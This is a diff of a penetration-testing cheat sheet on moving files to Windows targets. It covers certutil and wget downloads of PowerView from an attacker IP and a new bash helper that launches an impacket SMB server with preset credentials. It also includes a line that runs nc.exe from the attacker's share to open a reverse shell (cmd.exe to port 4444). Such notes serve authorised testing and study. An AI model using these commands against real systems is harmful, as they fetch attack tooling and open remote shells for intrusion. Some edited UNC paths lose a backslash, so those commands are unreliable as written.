@@ -42,30 +42,68 @@ wget http://10.10.10.10/PowerView.ps1 -OutFile PowerView.ps1
 
 ### <sup>Certutil</sup>
 
-```basic
+```cmd
 certutil -f -urlcache http://10.10.10.10/Powerview.ps1 C:\Users\Public\Powerview.ps1
 ```
 
 ### Impacket-smbserver
 
+smbshare alias
+
+```bash
+smbshare() {
+  local share_name="${1:-share}"
+  local user="${2:-df}"
+  local pass="${3:-df}"
+  local ip="${4:-$(hostname -I | awk '{print $1}')}"
+  local port="${5:-445}"
+
+  smbserver.py -smb2support -username "$user" -password "$pass" -port "$port" "$share_name" . &
+  local srv_pid=$!
+
+  echo "[+] SMB server started"
+  echo "    PID      : $srv_pid"
+  echo "    Share    : $share_name"
+  echo "    User     : $user"
+  echo "    Password : $pass"
+  echo "    IP       : $ip"
+  echo "    Port     : $port"
+  echo
+
+  echo "[+] Run this on Windows:"
+  echo "    net use \\\\$ip\\$share_name /user:$user $pass"
+  echo "    cd \\\\$ip\\$share_name"
+  echo
+
+  # Optional: quick copy example
+  echo "[+] Example file transfer:"
+  echo "    copy file.txt \\\\$ip\\$share_name\\"
+  echo
+
+  # Cleanup helper
+  echo "[*] To stop server: kill $srv_pid"
+
+  disown "$srv_pid"
+}
+```
+
 On Kali machine:
 
-```python
+```bash
 impacket-smbserver share /usr/share/windows-resources/binaries
 ```
 
 Connect and execute from Window machine:
 
-```basic
+```bash
 \\Kali-IP\share\nc.exe -e cmd.exe Kali-IP 4444
 ```
 
 Map drive on Window
 
-```basic
-net use z: \\10.10.14.2\folder-path
-z:
-copy file Z:\
+```bash
+net use \192.168.39.161\share /user:df df
+cd \192.168.39.161\share
 ```
 
 ### Bitsadmin
